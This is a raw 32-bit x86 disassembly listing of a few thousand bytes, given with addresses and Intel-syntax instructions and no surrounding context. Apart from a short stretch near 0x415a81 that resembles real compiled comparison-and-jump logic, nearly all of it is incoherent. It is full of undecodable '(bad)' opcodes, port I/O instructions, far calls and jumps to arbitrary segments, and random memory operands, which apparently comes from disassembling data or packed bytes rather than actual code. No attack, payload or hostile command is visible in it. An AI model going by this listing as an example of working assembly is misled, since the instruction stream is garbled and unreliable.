  415904:	inc    ebx
  415905:	repnz xor al,0x3b
  415908:	mov    ch,0x7b
  41590a:	add    BYTE PTR [ecx+esi*1+0x27],ah
  41590e:	out    0xab,eax
  415910:	pushf  
  415911:	dec    esi
  415912:	mov    al,ds:0x37364ace
  415917:	fisub  WORD PTR [esi]
  415919:	mov    ebp,0x9356cd48
  41591e:	xor    BYTE PTR [esi],al
  415920:	addr16 xchg esi,eax
  415922:	mov    dl,BYTE PTR [edi+0x1b5d0460]
  415928:	call   0x2feb:0x9841eb3f
  41592f:	mov    edx,es
  415931:	xor    al,0xd8
  415933:	sbb    al,0x57
  415935:	dec    edi
  415936:	es jl  0x415931
  415939:	mov    ecx,0x6bdb5f82
  41593e:	inc    ebp
  41593f:	mov    edi,0x80dae6fc
  415944:	jo     0x415986
  415946:	in     al,dx
  415947:	inc    esp
  415948:	fprem  
  41594a:	xor    dh,BYTE PTR [esi]
  41594c:	mov    al,0xac
  41594e:	push   edx
  41594f:	stos   DWORD PTR es:[edi],eax
  415950:	outs   dx,DWORD PTR ds:[esi]
  415951:	jnp    0x415987
  415953:	inc    ebx
  415954:	push   0xfffffff2
  415956:	cmp    al,0x51
  415958:	jnp    0x4158e4
  41595a:	xchg   edi,eax
  41595b:	test   al,0x40
  41595d:	aas    
  41595e:	idiv   DWORD PTR [edx+0x15fd7175]
  415964:	das    
  415965:	or     al,0xdf
  415967:	xor    DWORD PTR [edx],ecx
  415969:	xchg   ecx,eax
  41596a:	mov    ds:0x7caf0804,al
  41596f:	push   ecx
  415970:	push   ebx
  415971:	xchg   esi,eax
  415972:	mov    ds:0x841cf39d,al
  415977:	hlt    
  415978:	mov    bh,0x97
  41597a:	int3   
  41597b:	mov    ss,WORD PTR [esi]
  41597d:	mov    BYTE PTR [ecx-0x2e],dl
  415980:	(bad)  
  415981:	dec    edi
  415982:	(bad)  
  415983:	call   0x4f0cfb3a
  415988:	mov    eax,ds:0x4d0328bd
  41598d:	test   al,0x81
  41598f:	fnsave [edx-0x48088804]
  415995:	pop    ecx
  415996:	loop   0x415974
  415998:	and    bl,BYTE PTR [ebp+0x575ad43f]
  41599e:	popf   
  41599f:	jbe    0x41597d
  4159a1:	cld    
  4159a2:	cmp    esp,DWORD PTR [edi+0xb266a53]
  4159a8:	popf   
  4159a9:	add    al,0xb5
  4159ab:	(bad)  
  4159ac:	or     al,0xce
  4159ae:	leave  
  4159af:	pop    esi
  4159b0:	js     0x4159f4
  4159b2:	retf   
  4159b3:	lods   al,BYTE PTR ds:[esi]
  4159b4:	jmp    0x153:0x2b120279
  4159bb:	call   0x9fe274b3
  4159c0:	xchg   DWORD PTR [esi-0x7e4d5526],eax
  4159c6:	mov    BYTE PTR [edx-0x38],dl
  4159c9:	xor    eax,0xbdbe6088
  4159ce:	lea    edx,[ecx-0x4b32093]
  4159d4:	sub    dh,BYTE PTR [esi-0x1b]
  4159d7:	pop    es
  4159d8:	jns    0x4159b4
  4159da:	jno    0x4159a8
  4159dc:	lods   ax,WORD PTR ds:[esi]
  4159de:	push   esp
  4159df:	mov    ah,0xd6
  4159e1:	sti    
  4159e2:	(bad)  
  4159e3:	xor    eax,DWORD PTR [ebx+0x1b]
  4159e6:	dec    ecx
  4159e7:	push   cs
  4159e8:	fwait
  4159e9:	inc    ebp
  4159ea:	shl    DWORD PTR [edx+ebp*2-0x783e796],cl
  4159f1:	or     ch,0x17
  4159f4:	dec    DWORD PTR [edx+0x2b]
  4159f7:	shr    DWORD PTR [edx-0x2445083f],cl
  4159fd:	mov    WORD PTR [ebp-0x34d02419],?
  415a03:	jae    0x415a5a
  415a05:	test   DWORD PTR [ebx+0x72081e09],edx
  415a0b:	cs loopne 0x415a09
  415a0e:	add    ebx,DWORD PTR [edx]
  415a10:	pop    edx
  415a11:	sub    eax,0xcd7bd3b1
  415a16:	pop    eax
  415a17:	rcr    DWORD PTR [edi],1
  415a19:	int3   
  415a1a:	push   ecx
  415a1b:	push   ds
  415a1c:	fst    st(3)
  415a1e:	pop    esi
  415a1f:	jo     0x415a3a
  415a21:	push   ebx
  415a22:	clc    
  415a23:	mov    edi,0xd395773b
  415a28:	add    eax,0x4f0f3596
  415a2d:	jmp    0x415a02
  415a2f:	jae    0x4159ee
  415a31:	push   edi
  415a32:	scas   eax,DWORD PTR es:[edi]
  415a33:	pop    ecx
  415a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a35:	fs or  al,0xa0
  415a38:	push   ss
  415a39:	cwde   
  415a3a:	(bad)  
  415a3b:	aaa    
  415a3c:	adc    eax,0xc65ea9f
  415a41:	push   eax
  415a42:	fcmovbe st,st(0)
  415a44:	bound  esp,QWORD PTR [ebp-0x7f]
  415a47:	xor    BYTE PTR [ecx],cl
  415a49:	dec    ebp
  415a4a:	adc    BYTE PTR [edi-0x78],0x9f
  415a4e:	jge    0x4159d6
  415a50:	out    dx,al
  415a51:	dec    eax
  415a52:	ds add eax,0x6c608c9e
  415a58:	xchg   ecx,eax
  415a59:	mov    eax,ds:0x2630b581
  415a5e:	jge    0x415ab4
  415a60:	stos   BYTE PTR es:[edi],al
  415a61:	in     al,0xb1
  415a63:	loope  0x415a34
  415a65:	inc    eax
  415a66:	or     eax,0xa2e306e
  415a6b:	xchg   edx,eax
  415a6c:	enter  0xe8bb,0xf1
  415a70:	repz pop eax
  415a72:	mov    ds:0x5359c02d,eax
  415a77:	lds    esp,FWORD PTR [ecx+esi*1]
  415a7a:	jmp    0x92b8:0x43cc6375
  415a81:	add    ecx,esi
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	rcl    BYTE PTR [ecx+edx*4],1
  415ab2:	dec    DWORD PTR [esi+0x57]
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415aff
  415abc:	test   BYTE PTR [edi+edx*4-0x79],ah
  415ac0:	pop    ss
  415ac1:	loopne 0x415b1e
  415ac3:	mov    edi,DWORD PTR es:[ecx-0x5b72f9bc]
  415aca:	fdiv   DWORD PTR [edx+0x68c2634b]
  415ad0:	xchg   esp,eax
  415ad1:	cmp    DWORD PTR [ecx+0x5],esp
  415ad4:	mov    bh,0xa0
  415ad6:	stos   DWORD PTR es:[edi],eax
  415ad7:	add    al,0x2e
  415ad9:	push   cs
  415ada:	and    DWORD PTR [edi+0x1],edi
  415add:	stc    
  415ade:	push   esi
  415adf:	popf   
  415ae0:	and    DWORD PTR [ecx+0x9a72ecd],edx
  415ae6:	mov    edi,DWORD PTR [ecx+0x4cf953e8]
  415aec:	cmc    
  415aed:	test   dh,0xf0
  415af0:	outs   dx,BYTE PTR ds:[esi]
  415af1:	xor    esi,DWORD PTR ds:[esi-0xe7fa6ca]
  415af8:	out    0x73,eax
  415afa:	addr16 push ds
  415afc:	int    0x91
  415afe:	cmp    ebx,DWORD PTR [edi+0x39358a3c]
  415b04:	push   ebp
  415b05:	(bad)  
  415b07:	xor    dl,0x71
  415b0a:	jns    0x415b39
  415b0c:	cwde   
  415b0d:	cs pop ebp
  415b0f:	retf   
  415b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b11:	push   edx
  415b12:	xchg   esi,eax
  415b13:	aad    0x6b
  415b15:	sub    ebx,DWORD PTR [edi-0x77]
  415b18:	js     0x415ad7
  415b1a:	and    edx,DWORD PTR [edx-0x5e]
  415b1d:	jns    0x415aae
  415b1f:	nop
  415b20:	(bad)  
  415b21:	xor    al,0x40
  415b23:	mov    esi,0x33cad263
  415b28:	cmp    eax,0x34b3c36c
  415b2d:	stos   DWORD PTR es:[edi],eax
  415b2e:	loop   0x415b1e
  415b30:	push   es
  415b31:	add    eax,0xa61021f3
  415b36:	or     BYTE PTR [ebx-0x1f],ch
  415b39:	out    0x12,al
  415b3b:	pop    ecx
  415b3c:	idiv   BYTE PTR [edx-0x3d]
  415b3f:	xlat   BYTE PTR ds:[ebx]
  415b40:	push   ebp
  415b41:	xchg   esi,edx
  415b43:	mov    bh,0x7
  415b45:	out    0x30,eax
  415b47:	outs   dx,DWORD PTR ds:[esi]
  415b48:	mov    ecx,0x23d54e8
  415b4d:	jg     0x415bb0
  415b4f:	mov    edi,0x26fd06ec
  415b54:	add    dh,al
  415b56:	popa   
  415b57:	or     BYTE PTR [edx+0x5d],bl
  415b5a:	jmp    0x415b13
  415b5c:	les    edx,FWORD PTR [edx-0x2f9d3cca]
  415b62:	aaa    
  415b63:	xchg   ebx,eax
  415b64:	pop    ecx
  415b65:	dec    eax
  415b66:	idiv   DWORD PTR ds:0xa844b118
  415b6c:	mov    esi,0x8afcdc88
  415b71:	loop   0x415b9d
  415b73:	push   esp
  415b74:	xor    BYTE PTR [edx],dl
  415b76:	ror    BYTE PTR [eax],0x90
  415b79:	aaa    
  415b7a:	xchg   esi,eax
  415b7b:	ror    BYTE PTR [esi],1
  415b7d:	sub    al,0x1d
  415b7f:	dec    esp
  415b80:	cld    
  415b81:	mov    ch,0x67
  415b83:	sub    eax,0xf82979da
  415b88:	cmp    bh,BYTE PTR [ebx+edi*8-0x76fe8cb4]
  415b8f:	mov    ds:0xea696474,eax
  415b94:	dec    eax
  415b95:	rcl    BYTE PTR [esi+0x7d],0x13
  415b99:	cmp    eax,0x4ac00a1c
  415b9e:	shr    dh,1
  415ba0:	cmp    eax,ebx
  415ba2:	call   0x6fed:0x9c81155c
  415ba9:	sahf   
  415baa:	push   cs
  415bab:	ret    0x5348
  415bae:	or     ecx,edi
  415bb0:	mov    bh,0x2c
  415bb2:	(bad)  
  415bb3:	dec    esp
  415bb4:	jnp    0x415ba3
  415bb6:	dec    ebp
  415bb7:	cmp    eax,0x50eefcc3
  415bbc:	push   ebx
  415bbe:	mov    ebp,0x653ad5b8
  415bc3:	ss and edi,edx
  415bc6:	pop    DWORD PTR [ecx+esi*1]
  415bc9:	mov    al,ds:0x767ed065
  415bce:	pop    ss
  415bcf:	xchg   esp,eax
  415bd0:	jmp    0xd5ad2efe
  415bd5:	dec    edx
  415bd6:	ja     0x415c03
  415bd8:	ss push ss
  415bda:	cmp    BYTE PTR [ecx],bl
  415bdc:	aam    0x57
  415bde:	and    eax,0xfb5cf3a8
  415be3:	arpl   bp,di
  415be5:	jg     0x415bef
  415be7:	(bad)  
  415be8:	cs jae 0x415bdf
  415beb:	(bad)  
  415bec:	pop    ebp
  415bed:	ret    
  415bee:	les    ecx,FWORD PTR ds:0xaf187fe5
  415bf4:	loopne 0x415c08
  415bf6:	jns    0x415bcc
  415bf8:	push   edi
  415bfa:	outs   dx,DWORD PTR ds:[esi]
  415bfb:	xchg   DWORD PTR [eax],ecx
  415bfd:	(bad)  
  415bfe:	mov    esi,0x41095cc7
  415c03:	jmp    0xb9f31a09
  415c08:	cmp    BYTE PTR [edx+eiz*4+0x175e0da8],dl
  415c0f:	xchg   DWORD PTR [ebx],esi
  415c11:	inc    ebp
  415c12:	sub    eax,0x9e639c5f
  415c17:	adc    eax,0xeee36ef6
  415c1c:	pop    ebx
  415c1d:	push   ss
  415c1e:	sub    edx,eax
  415c20:	nop
  415c21:	cdq    
  415c22:	mov    edi,0x439d5133
  415c27:	mov    ebp,0x5eca8618
  415c2c:	pop    es
  415c2d:	gs retf 0xe2af
  415c31:	mov    ah,0xd4
  415c33:	loope  0x415c56
  415c35:	mov    ebp,0x5c7cba8d
  415c3a:	out    0x54,al
  415c3c:	cmp    eax,0x68787f07
  415c41:	dec    ecx
  415c42:	mov    cl,0xcb
  415c44:	jb     0x415c06
  415c46:	cdq    
  415c47:	mov    esi,ebx
  415c49:	adc    eax,0xa503c6b8
  415c4e:	popa   
  415c4f:	push   es
  415c50:	adc    eax,0x168ce4f8
  415c55:	lock fwait
  415c57:	xor    eax,0x43e2700a
  415c5c:	not    BYTE PTR [edi-0x5d]
  415c5f:	push   edx
  415c60:	dec    edx
  415c61:	popw   ss
  415c63:	lods   eax,DWORD PTR ds:[esi]
  415c64:	add    ch,0x78
  415c67:	adc    dl,BYTE PTR fs:[esp+eiz*2+0x3a]
  415c6c:	adc    BYTE PTR [ecx+0x601edfc],ah
  415c72:	lds    ebx,FWORD PTR [eax-0x3f]
  415c75:	inc    eax
  415c76:	pushf  
  415c77:	mov    al,ds:0xc31a32c2
  415c7c:	mov    ds:0xaaacf51d,eax
  415c81:	xchg   DWORD PTR [eax+0x73],esi
  415c84:	ins    DWORD PTR es:[edi],dx
  415c85:	or     esp,ebx
  415c87:	add    ah,ch
  415c89:	sub    ebp,DWORD PTR [edi-0x2c]
  415c8c:	jae    0x415caf
  415c8e:	or     eax,edx
  415c90:	cmp    esp,DWORD PTR [esi]
  415c92:	jae    0x415c63
  415c94:	pop    esi
  415c95:	cmp    al,0xfa
  415c97:	fs cmp eax,0xb3d6c564
  415c9d:	dec    ebp
  415c9e:	add    eax,0x788873a6
  415ca3:	aas    
  415ca4:	jmp    0x415ccc
  415ca6:	and    BYTE PTR [eax],0x5c
  415ca9:	xor    eax,0xb866e786
  415cae:	cmp    BYTE PTR [ecx-0x6b964a5a],dh
  415cb4:	xor    eax,DWORD PTR [eax+0x32]
  415cb7:	mov    dl,0xdb
  415cb9:	shr    DWORD PTR [edx-0x26028f1b],1
  415cbf:	sub    cl,0x4c
  415cc2:	push   0xdf28f4d8
  415cc7:	xlat   BYTE PTR ds:[ebx]
  415cc8:	rcl    ebx,cl
  415cca:	bound  edi,QWORD PTR [ebp+0x13]
  415ccd:	(bad)  
  415cce:	push   edx
  415ccf:	shr    DWORD PTR [edx+0x5a],cl
  415cd2:	neg    BYTE PTR [esi+0x76]
  415cd5:	dec    ebx
  415cd6:	fistp  DWORD PTR [ecx+0x4b]
  415cd9:	cmp    dh,bl
  415cdb:	jle    0x415cc1
  415cdd:	mov    ebx,0xec879af5
  415ce2:	dec    ebx
  415ce3:	dec    eax
  415ce4:	das    
  415ce5:	dec    eax
  415ce6:	test   eax,0xa2110a26
  415ceb:	push   esi
  415cec:	outs   dx,DWORD PTR ds:[esi]
  415ced:	mov    ebx,0xf72f8149
  415cf2:	push   edx
  415cf3:	scas   al,BYTE PTR es:[edi]
  415cf4:	push   esp
  415cf5:	dec    esp
  415cf6:	inc    esp
  415cf7:	sbb    dh,BYTE PTR [edx-0x54b1296b]
  415cfd:	(bad)  
  415cfe:	xor    eax,0x892a1bd7
  415d03:	fidiv  DWORD PTR [ecx-0x797cbc03]
  415d09:	mov    al,0xb
  415d0b:	push   ebx
  415d0c:	xor    bh,BYTE PTR [edi-0x5ff497c4]
  415d12:	pop    ecx
  415d13:	aad    0x33
  415d15:	push   ds
  415d16:	jnp    0x415d07
  415d18:	and    bl,BYTE PTR [ebp+0xc]
  415d1b:	pusha  
  415d1c:	sbb    al,0xf2
  415d1e:	ret    
  415d1f:	pop    ebx
  415d20:	loopne 0x415cb2
  415d22:	dec    edx
  415d23:	push   es
  415d24:	sub    BYTE PTR [ebx+0x65],0xf1
  415d28:	xchg   ebx,eax
  415d29:	pop    ebp
  415d2a:	dec    BYTE PTR [eax]
  415d2c:	adc    BYTE PTR [esi],bh
  415d2e:	xchg   DWORD PTR [ebx+0x11],edx
  415d31:	outs   dx,DWORD PTR ds:[esi]
  415d32:	dec    ecx
  415d33:	jo     0x415d93
  415d35:	(bad)  
  415d36:	scas   eax,DWORD PTR es:[edi]
  415d37:	je     0x415cba
  415d39:	push   eax
  415d3a:	retf   0xfaa6
  415d3d:	outs   dx,DWORD PTR ds:[esi]
  415d3e:	cld    
  415d3f:	mov    ch,0x55
  415d41:	or     bl,BYTE PTR [edi]
  415d43:	or     BYTE PTR [ecx-0x27],bl
  415d46:	shr    BYTE PTR [esp+edx*8],1
  415d49:	jno    0x415d56
  415d4b:	retf   0x34ac
  415d4e:	lock mov eax,ds:0x73cd64ca
  415d54:	jo     0x415dd4
  415d56:	sub    DWORD PTR [esi+0xd155e31],edi
  415d5c:	pop    eax
  415d5d:	push   ebx
  415d5e:	mov    dl,0x52
  415d60:	je     0x415da0
  415d62:	mov    ebx,0x59dcbd9d
  415d67:	cs into 
  415d69:	out    0xdb,eax
  415d6b:	xchg   edi,eax
  415d6c:	and    eax,0x6ab9899c
  415d71:	add    al,dh
  415d73:	inc    ecx
  415d75:	test   al,0xf3
  415d77:	inc    eax
  415d78:	fnstcw WORD PTR [edi+ecx*4+0x21e0fdfd]
  415d7f:	rcl    DWORD PTR [eax+eiz*4],cl
  415d82:	cmc    
  415d83:	mov    dl,0x97
  415d85:	mov    al,ds:0x91f68379
  415d8a:	ret    0x7c1b
  415d8d:	mov    bl,0x55
  415d8f:	bound  ecx,QWORD PTR [edi-0x7e57cdf3]
  415d95:	hlt    
  415d96:	xchg   eax,edx
  415d98:	pop    eax
  415d99:	sub    ebp,ecx
  415d9b:	data16 jns 0x415e1a
  415d9e:	and    eax,0x2a64edda
  415da3:	ja     0x415d6e
  415da5:	iret   
  415da6:	push   ecx
  415da7:	(bad)  
  415da8:	adc    al,BYTE PTR [eax-0x6f22733c]
  415dae:	dec    ebx
  415daf:	(bad)  
  415db0:	adc    BYTE PTR [ebx+0x318246a9],al
  415db6:	jl     0x415e13
  415db8:	sbb    al,0xc1
  415dba:	mov    ebp,0x8bb0bce
  415dbf:	add    BYTE PTR [ebp-0x11d40cc1],al
  415dc5:	enter  0x7c6b,0x43
  415dc9:	sub    BYTE PTR [edi-0x5bf4f0ee],0x9b
  415dd0:	xchg   esi,eax
  415dd1:	xor    DWORD PTR [edi],edx
  415dd3:	std    
  415dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dd5:	pop    edi
  415dd6:	ret    0x34b6
  415dd9:	adc    DWORD PTR [ebp+ecx*2-0x67],eax
  415ddd:	xor    bh,dh
  415ddf:	and    eax,esi
  415de1:	sbb    ah,BYTE PTR [eax+esi*2+0x65e34605]
  415de8:	test   DWORD PTR [ebp+0x10],esi
  415deb:	sub    eax,0xf4f6a115
  415df0:	add    ebx,ebx
  415df2:	shl    BYTE PTR [ecx],0x1a
  415df5:	mov    al,ah
  415df7:	in     eax,dx
  415df8:	ins    BYTE PTR es:[edi],dx
  415df9:	mov    ebp,0xbd5f7244
  415dfe:	mov    WORD PTR [ecx-0x124afbed],ds
  415e04:	(bad)  
  415e05:	pusha  
  415e06:	ret    0x5333
  415e09:	imul   eax,DWORD PTR [esi+0x5e],0xdec7f1c7
  415e10:	jo     0x415df7
  415e12:	mov    ah,BYTE PTR [esi]
  415e14:	jnp    0x415e20
  415e16:	dec    ebx
  415e17:	jae    0x415e7d
  415e19:	sbb    BYTE PTR [edi+0x7340bc82],0xf5
  415e20:	or     DWORD PTR [edx],edi
  415e22:	add    ch,bh
  415e24:	pop    ebp
  415e25:	pushf  
  415e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e27:	out    dx,al
  415e28:	jp     0x415df4
  415e2a:	jbe    0x415e0f
  415e2c:	call   0x4eeec9a5
  415e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e32:	adc    ebx,DWORD PTR [ebx-0x4c]
  415e35:	cli    
  415e36:	mov    ebx,0xd13d9e75
  415e3b:	or     dl,al
  415e3d:	inc    ebp
  415e3e:	inc    edx
  415e3f:	mov    ds:0x1604a600,al
  415e44:	(bad)  
  415e46:	cdq    
  415e47:	adc    BYTE PTR ds:0xb940a47a,bh
  415e4d:	fnsave [esi-0x3af96ee3]
  415e53:	jbe    0x415ea2
  415e55:	mov    al,ds:0x42fcbfd4
  415e5a:	jns    0x415e8f
  415e5c:	sub    ebx,DWORD PTR [ebx+0x50]
  415e5f:	ins    DWORD PTR es:[edi],dx
  415e60:	ins    BYTE PTR es:[edi],dx
  415e61:	lds    ebx,FWORD PTR [eax-0x1e4c79ab]
  415e67:	mov    ecx,0x8cfedfdc
  415e6c:	jle    0x415ecb
  415e6e:	not    BYTE PTR [eax+eiz*4+0x23]
  415e72:	lock cmp BYTE PTR [esi],0x14
  415e76:	pop    ds
  415e77:	dec    esi
  415e78:	fstp   QWORD PTR [edi+0x3682a6c]
  415e7e:	sbb    eax,0x5087dfd0
  415e83:	sub    al,0x59
  415e85:	mov    cl,0xb8
  415e87:	mov    edi,0x9e53fcaa
  415e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e8d:	loope  0x415e71
  415e8f:	or     al,BYTE PTR [esi-0x31]
  415e92:	jno    0x415e7f
  415e94:	mov    edi,0xf523bf96
  415e99:	outs   dx,DWORD PTR ds:[esi]
  415e9b:	mov    edi,0xc6b6430b
  415ea0:	mov    bh,BYTE PTR [ecx-0xcc0bd1a]
  415ea6:	mov    DWORD PTR [ecx-0x7414cf77],esp
  415eac:	and    al,0xed
  415eae:	leave  
  415eaf:	pop    eax
  415eb0:	mov    bl,0xad
  415eb2:	mov    DWORD PTR [eax+0x60],esp
  415eb5:	xchg   edi,eax
  415eb6:	push   edx
  415eb7:	out    dx,eax
  415eb8:	dec    edi
  415eb9:	push   cs
  415eba:	sti    
  415ebb:	sahf   
  415ebc:	xor    ah,BYTE PTR [edx+eiz*2-0x5f]
  415ec0:	adc    eax,0xfbbf0941
  415ec5:	in     eax,dx
  415ec6:	xchg   esi,eax
  415ec7:	jp     0x415f3e
  415ec9:	push   eax
  415eca:	or     al,0xaa
  415ecc:	xchg   DWORD PTR [ebx],edi
  415ece:	dec    esi
  415ecf:	fbstp  TBYTE PTR ss:[eax-0x507bb093]
  415ed6:	jnp    0x415ed2
  415ed8:	iret   
  415ed9:	cmp    esi,eax
  415edb:	jmp    0x415f28
  415edd:	adc    eax,0xc3ccc30e
  415ee2:	push   0x31
  415ee4:	mov    edx,0xf6a0c12b
  415ee9:	mov    eax,0xaa9d5ffd
  415eee:	adc    DWORD PTR [ecx-0x1e],ebp
  415ef1:	or     eax,0x8746ddce
  415ef6:	push   esp
  415ef7:	loopne 0x415efa
  415ef9:	into   
  415efa:	fbstp  TBYTE PTR [edi+0x21]
  415efd:	outs   dx,DWORD PTR ds:[esi]
  415efe:	or     dh,BYTE PTR [ecx+0x51]
  415f01:	(bad)  
  415f02:	stos   BYTE PTR es:[edi],al
  415f03:	inc    eax
  415f04:	push   ds
  415f05:	cwde   
  415f06:	lods   eax,DWORD PTR ds:[esi]
  415f07:	pop    ebx
  415f08:	(bad)
  415f0b:	xor    DWORD PTR [ebx],esp
  415f0d:	ds int3 
  415f0f:	icebp  
  415f10:	xor    BYTE PTR [bx+si+0x7d],bl
  415f14:	stos   BYTE PTR es:[edi],al
  415f15:	test   eax,0x3011d379
  415f1a:	push   edi
  415f1b:	mov    ecx,0xd3caee07
  415f20:	adc    eax,DWORD PTR [edi]
  415f22:	popa   
  415f23:	lods   al,BYTE PTR ds:[esi]
  415f24:	xchg   esp,eax
  415f25:	push   eax
  415f27:	mov    BYTE PTR [ecx],ah
  415f29:	adc    al,0x1d
  415f2b:	ins    DWORD PTR es:[edi],dx
  415f2c:	(bad)  
  415f2d:	loop   0x415f67
  415f2f:	push   esp
  415f30:	stc    
  415f31:	adc    BYTE PTR [edx+0x2522d7fb],ah
  415f37:	push   ebx
  415f38:	sub    al,0xba
  415f3a:	jo     0x415ef3
  415f3c:	not    dh
  415f3e:	(bad)  
  415f3f:	loope  0x415fbf
  415f41:	xor    al,0xf7
  415f43:	sub    eax,0xf8baa7c7
  415f48:	mov    esi,0xc386d405
  415f4d:	mov    al,0x33
  415f4f:	xor    al,0x33
  415f51:	push   ebx
  415f52:	dec    ebp
  415f53:	ins    DWORD PTR es:[edi],dx
  415f54:	add    al,0xb4
  415f56:	sti    
  415f57:	call   0xdd3e:0x42b62afb
  415f5e:	adc    BYTE PTR [edx],0x21
  415f61:	cmp    ebp,edi
  415f63:	jmp    0x72b1:0xf9e5f2ad
  415f6a:	cli    
  415f6b:	inc    edi
  415f6c:	test   eax,0x6a38f3ea
  415f71:	popf   
  415f72:	xor    eax,0x14cc927a
  415f77:	in     eax,0x88
  415f79:	enter  0x71a7,0xe4
  415f7d:	adc    DWORD PTR [edi+0x33253832],edi
  415f83:	loope  0x415fa0
  415f85:	mov    BYTE PTR [ecx],al
  415f87:	cdq    
  415f88:	xor    edi,ebp
  415f8a:	jmp    0x539e:0xdad2358f
  415f91:	inc    ebx
  415f92:	pusha  
  415f93:	data16 cmp dl,ah
  415f96:	sbb    al,0x59
  415f98:	jp     0x415fa2
  415f9a:	cmc    
  415f9b:	icebp  
  415f9c:	xor    esi,DWORD PTR [ecx]
  415f9e:	stc    
  415f9f:	and    BYTE PTR [edi+0x4a0c414],al
  415fa5:	adc    eax,0xa9f650fb
  415faa:	xchg   esi,eax
  415fab:	push   ss
  415fac:	and    DWORD PTR [edx],ecx
  415fae:	mov    edi,0x832f054a
  415fb3:	dec    ebx
  415fb4:	and    BYTE PTR [edi-0x64d225ff],cl
  415fba:	mov    al,0xac
  415fbc:	clc    
  415fbd:	mov    ch,BYTE PTR [eax]
  415fbf:	lods   al,BYTE PTR ds:[esi]
  415fc0:	jne    0x415fbe
  415fc2:	mov    ebp,0x6132aac8
  415fc7:	sbb    al,0x70
  415fc9:	ficomp WORD PTR [ecx]
  415fcb:	lock jns 0x415f65
  415fce:	push   edx
  415fcf:	repnz or eax,0x70c3356d
  415fd5:	ror    BYTE PTR [eax+0x36],0xa7
  415fd9:	loope  0x415f69
  415fdb:	or     bl,BYTE PTR [eax-0x2812120]
  415fe1:	out    0x1b,eax
  415fe3:	xor    eax,0xe8da8a9
  415fe8:	ds pop es
  415fea:	pop    edx
  415feb:	sti    
  415fec:	add    eax,DWORD PTR [esp+eiz*4-0x22]
  415ff0:	xchg   ebp,eax
  415ff1:	out    dx,eax
  415ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ff3:	icebp  
  415ff4:	lea    ebp,[edi-0x26800e93]
  415ffa:	inc    ebp
  415ffb:	ror    BYTE PTR [eax],cl
  415ffd:	xlat   BYTE PTR ds:[ebx]
  415ffe:	das    
  415fff:	mov    esp,0xe9a914e0
  416004:	cmp    al,0x92
  416006:	jl     0x415faf
  416008:	stc    
  416009:	cmp    eax,0x62863ba7
  41600e:	xor    DWORD PTR [edi],ecx
  416010:	loope  0x415fe9
  416012:	and    dh,BYTE PTR [esi+0x52]
  416015:	jecxz  0x416015
  416017:	xor    al,0xe7
  416019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41601a:	ret    
  41601b:	mov    eax,ds:0xec87f471
  416020:	lds    ebx,FWORD PTR [edx]
  416022:	dec    ebp
  416023:	std    
  416024:	add    al,0x7b
  416026:	aas    
  416027:	xor    eax,0x9f6a142e
  41602c:	icebp  
  41602d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41602e:	and    BYTE PTR [ebx-0x42],ch
  416031:	ins    BYTE PTR es:[edi],dx
  416032:	fisttp WORD PTR [ecx]
  416034:	mov    DWORD PTR [eax+0x1e],ebp
  416037:	inc    ebp
  416038:	aam    0x8
  41603a:	jl     0x415fc7
  41603c:	(bad)  
  41603d:	les    esi,FWORD PTR [ecx+ebx*1]
  416040:	popf   
  416041:	xchg   ebp,eax
  416042:	mov    eax,0xbf51e07c
  416047:	nop
  416048:	clc    
  416049:	(bad)  
  41604a:	stos   BYTE PTR es:[edi],al
  41604b:	or     DWORD PTR [ecx+0x63063673],esi
  416051:	bound  edx,QWORD PTR [edi-0x6b]
  416054:	idiv   BYTE PTR ds:[esi]
  416057:	dec    ecx
  416058:	pop    ds
  416059:	jl     0x416065
  41605b:	xor    BYTE PTR [eax],bl
  41605d:	cs sub bh,dl
  416060:	push   ebp
  416061:	popa   
  416062:	mov    edx,0xee9db0c6
  416067:	xor    ah,BYTE PTR [ebx]
  416069:	jge    0x41607f
  41606b:	xchg   esp,eax
  41606c:	retf   0x1a1e
  41606f:	xor    BYTE PTR [eax+0x4e618530],0x76
  416076:	xchg   DWORD PTR [edx-0x62dd37a6],eax
  41607c:	popa   
  41607d:	out    0x3c,eax
  41607f:	imul   ecx,DWORD PTR [esi],0x275529ee
  416085:	push   eax
  416086:	test   DWORD PTR [esi],eax
  416088:	fidiv  DWORD PTR ds:0x9af77241
  41608e:	sbb    DWORD PTR [ecx],ebp
  416090:	xchg   esp,eax
  416091:	icebp  
  416092:	sub    ch,BYTE PTR [edx+0x42]
  416095:	addr16 dec ebx
  416097:	loop   0x41604e
  416099:	leave  
  41609a:	repnz in eax,0xac
  41609d:	not    BYTE PTR [edi+0x369e6c51]
  4160a3:	and    eax,0xbc117386
  4160a8:	ret    0xed5f
  4160ab:	add    eax,0x2a658b4b
  4160b0:	pop    ebx
  4160b1:	xchg   ebp,eax
  4160b2:	jo     0x4160e0
  4160b4:	repz jge 0x416106
  4160b7:	xor    eax,0xe5c9581f
  4160bc:	fisttp WORD PTR [ebp+0x3b]
  4160bf:	add    ebp,edx
  4160c1:	outs   dx,DWORD PTR gs:[esi]
  4160c3:	inc    ebp
  4160c4:	imul   esp,DWORD PTR [ecx],0xffffff81
  4160c7:	setp   BYTE PTR [ebp-0x44]
  4160cb:	jmp    0x9f12:0x491032df
  4160d2:	inc    edi
  4160d3:	fmul   QWORD PTR [esp+ecx*4+0x7c378653]
  4160da:	aad    0x7a
  4160dc:	inc    eax
  4160dd:	mov    edx,0xc10aedf7
  4160e2:	xchg   al,dl
  4160e4:	mov    cl,0xd
  4160e6:	dec    esi
  4160e7:	adc    ebp,ebx
